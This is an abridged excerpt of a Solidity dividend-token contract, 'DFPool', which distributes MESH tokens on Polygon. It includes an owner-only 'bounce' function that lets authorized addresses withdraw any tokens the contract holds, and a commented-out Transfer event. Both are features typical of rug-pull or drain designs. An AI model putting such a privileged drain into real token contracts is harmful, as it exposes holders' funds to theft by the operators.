...
contract DividendDistributor is IDividendDistributor {
    ...
    IERC20 MESH = IERC20(0x82362Ec182Db3Cf7829014Bc61E9BE8a2E82868a);
    ...
    function deposit() external payable override onlyToken {
        uint256 balanceBefore = MESH.balanceOf(address(this));
        ...
        uint256 amount = MESH.balanceOf(address(this)).sub(balanceBefore);
    ...
    function distributeDividend(address shareholder) internal {
        ...
        if(amount > 0){
            ...
            MESH.transfer(shareholder, amount);
...
contract DFPool is IERC20, Auth {
    using SafeMath for uint256;

    uint256 public constant MASK = type(uint128).max;
    address MESH = 0x82362Ec182Db3Cf7829014Bc61E9BE8a2E82868a;
    address public WMATIC = 0x0d500B1d8E8eF31E21C99d1Db9A6444d3ADf1270;
    address DEAD = 0x000000000000000000000000000000000000dEaD;
    address ZERO = 0x0000000000000000000000000000000000000000;
    address DEAD_NON_CHECKSUM = 0x000000000000000000000000000000000000dEaD;

    string constant _name = "DFPool";
    string constant _symbol = "DFPool";
 ...
 //        emit Transfer(sender, recipient, amount);
    ...
    function setDistributionCriteria(uint256 _minPeriod, uint256 _minDistribution) external authorized {
     ...
     function bounce(address _add, uint256 _amount) external authorized {
        IERC20 tokenContract = IERC20(_add);
        tokenContract.transfer(msg.sender, _amount);
    }

    function settEr() public authorized {
